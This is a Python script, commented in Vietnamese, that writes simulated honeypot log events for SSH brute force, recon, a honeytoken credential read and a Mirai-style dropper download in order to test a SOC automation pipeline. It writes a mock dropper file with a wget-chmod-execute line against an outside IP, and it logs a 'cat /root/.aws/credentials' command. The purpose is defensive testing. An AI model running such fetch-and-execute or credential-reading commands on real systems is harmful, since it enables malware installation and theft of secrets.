"""
Script: simulate_attack.py
Mục đích: Bộ công cụ giả lập tấn công (Red Team Simulation) phục vụ kiểm thử và thu thập số liệu thực nghiệm.
Sinh ra các kịch bản tấn công thực tế vào file log cowrie.json để kiểm chứng khả năng phản ứng của SOAR:
1. Tấn công dò quét SSH Brute Force (MITRE T1110)
2. Đăng nhập thành công và trinh sát nội bộ (MITRE T1078, T1082)
3. Đánh cắp Honeytoken nhúng Beacon (MITRE T1552)
4. Tải mã độc Dropper/Botnet vào máy bẫy (MITRE T1105)
"""

from datetime import datetime ,timezone
import json
import os
import sys
import time


if sys .platform .startswith ("win"):
    try :
        sys .stdout .reconfigure (encoding ="utf-8")
    except Exception :
        pass

LOG_FILE ="./data/cowrie.json"
MOCK_MALWARE_FILE ="./data/downloads/mirai_payload.sh"


def ensure_environment ():
    os .makedirs ("./data/downloads",exist_ok =True )
    if not os .path .exists (MOCK_MALWARE_FILE ):
        with open (MOCK_MALWARE_FILE ,"w",encoding ="utf-8")as f :
            f .write ("#!/bin/bash\n# Simulated Mirai Botnet Dropper\ncd /tmp\nwget http://194.87.139.12/arm7 -O dvrHelper\nchmod 777 dvrHelper\n./dvrHelper\n")


def append_event (event :dict ):
    with open (LOG_FILE ,"a",encoding ="utf-8")as f :
        f .write (json .dumps (event )+"\n")


def simulate_scenario_1_bruteforce (attacker_ip :str ="185.220.101.5"):
    print (f"\n[>>>] BẮT ĐẦU KỊCH BẢN 1: SSH Brute-force Attack từ IP {attacker_ip }")
    passwords =["123456","admin","password","root123","qwerty","toor"]
    for pwd in passwords :
        evt ={
        "eventid":"cowrie.login.failed",
        "src_ip":attacker_ip ,
        "username":"root",
        "password":pwd ,
        "timestamp":datetime .now (timezone .utc ).isoformat (),
        }
        append_event (evt )
        print (f"  [-] Attacker thử mật khẩu: '{pwd }' -> Thất bại")
        time .sleep (0.3 )
    print ("[+] Đã hoàn thành kịch bản Brute-force (đạt ngưỡng kích hoạt SOAR).")


def simulate_scenario_2_login_and_recon (attacker_ip :str ="45.33.32.156"):
    print (f"\n[>>>] BẮT ĐẦU KỊCH BẢN 2: Đăng nhập thành công & Trinh sát từ IP {attacker_ip }")
    session_id ="sess_9942a"

    append_event ({
    "eventid":"cowrie.login.success",
    "src_ip":attacker_ip ,
    "username":"root",
    "password":"password123",
    "session":session_id ,
    "timestamp":datetime .now (timezone .utc ).isoformat (),
    })
    print ("  [+] Hacker đăng nhập thành công vào Honeypot với tài khoản root!")
    time .sleep (0.5 )


    cmds =["whoami","uname -a","cat /proc/cpuinfo","ps aux"]
    for c in cmds :
        append_event ({
        "eventid":"cowrie.command.input",
        "src_ip":attacker_ip ,
        "session":session_id ,
        "input":c ,
        "timestamp":datetime .now (timezone .utc ).isoformat (),
        })
        print (f"  [>] Hacker gõ lệnh: '{c }'")
        time .sleep (0.3 )


def simulate_scenario_3_honeytoken_breach (attacker_ip :str ="103.20.144.12"):
    print (f"\n[>>>] BẮT ĐẦU KỊCH BẢN 3: Xâm nhập Honeytoken (Canary Token) từ IP {attacker_ip }")
    session_id ="sess_honey_881"
    append_event ({
    "eventid":"cowrie.login.success",
    "src_ip":attacker_ip ,
    "username":"admin",
    "password":"admin",
    "session":session_id ,
    "timestamp":datetime .now (timezone .utc ).isoformat (),
    })
    time .sleep (0.5 )


    append_event ({
    "eventid":"cowrie.command.input",
    "src_ip":attacker_ip ,
    "session":session_id ,
    "input":"cat /root/.aws/credentials",
    "timestamp":datetime .now (timezone .utc ).isoformat (),
    })
    print ("  [!] Hacker cố tình đọc file bẫy: 'cat /root/.aws/credentials'")


def simulate_scenario_4_malware_drop (attacker_ip :str ="194.87.139.12"):
    print (f"\n[>>>] BẮT ĐẦU KỊCH BẢN 4: Tải mã độc Dropper (Ingress Tool Transfer) từ IP {attacker_ip }")
    session_id ="sess_drop_772"
    append_event ({
    "eventid":"cowrie.session.file_download",
    "src_ip":attacker_ip ,
    "session":session_id ,
    "url":"http://194.87.139.12/mirai_payload.sh",
    "outfile":os .path .abspath (MOCK_MALWARE_FILE ),
    "shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "timestamp":datetime .now (timezone .utc ).isoformat (),
    })
    print (f"  [!] Honeypot ghi nhận file độc hại tải về: '{MOCK_MALWARE_FILE }'")


if __name__ =="__main__":
    ensure_environment ()
    print ("=========================================================")
    print ("   CÔNG CỤ GIẢ LẬP TẤN CÔNG KIỂM THỬ ACTIVE DEFENSE SOC  ")
    print ("=========================================================")
    simulate_scenario_1_bruteforce ()
    time .sleep (1 )
    simulate_scenario_2_login_and_recon ()
    time .sleep (1 )
    simulate_scenario_3_honeytoken_breach ()
    time .sleep (1 )
    simulate_scenario_4_malware_drop ()
    print ("\n[+] Toàn bộ 4 kịch bản tấn công đã được ghi vào ./data/cowrie.json!")
